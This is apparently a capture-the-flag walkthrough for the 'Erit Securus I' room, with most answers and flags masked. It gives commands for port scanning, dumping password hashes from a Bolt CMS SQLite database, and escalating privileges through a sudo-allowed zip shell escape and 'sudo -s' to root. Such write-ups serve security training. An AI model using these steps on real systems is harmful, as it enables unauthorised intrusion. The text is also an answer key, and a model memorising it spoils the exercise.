# Erit Securus I

- Deploy box

	  no answer needed

- How many ports are open?

	- `scilla port -target <TARGET_IP>`
	- `2`

- What ports are open? Comma separated, lowest first: `**,**`

	- `**,**`

- What CMS is the website built on?

	- `bolt`

- In the exploit from 2020-04-05, what language is used to write the exploit?

	- `python`

- As the exploit is authenticated, you will also need a username and password. Knowing the URI for the login-portal is also critical for the exploit to work. Find the login-portal and try login in.

	  no answer needed

- What is the username of the user running the web server?

	- `www-data`

- What is the users password?

	- `sqlite3 bolt.db`
	- `.tables`
	- `select * from bolt_users;`
	- `echo '$2y$*****************************************************' > hash`
	- `*********`

- Flag 1

	- `su wileec`
	- `cat flag1.txt`
	- `********************`

- User wileec can sudo! What can he sudo?

	- `(*******) NOPASSWD: /usr/bin/***`

- Flag 2

	- `$ TF=$(mktemp -u)`
	- `sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'`
	- `sudo rm $TF`
	- `SHELL=/bin/bash script -q /dev/null`
	- `ls`
	- `cat flag2.txt`
	- `********************************`

- What sudo rights does jsmith have?

	- `(ALL : ALL) NOPASSWD: ALL`

- Flag 3

	- `sudo -s`
	- `cd /root/`
	- `ls`
	- `cat flag3.txt`
	- `****************************************`
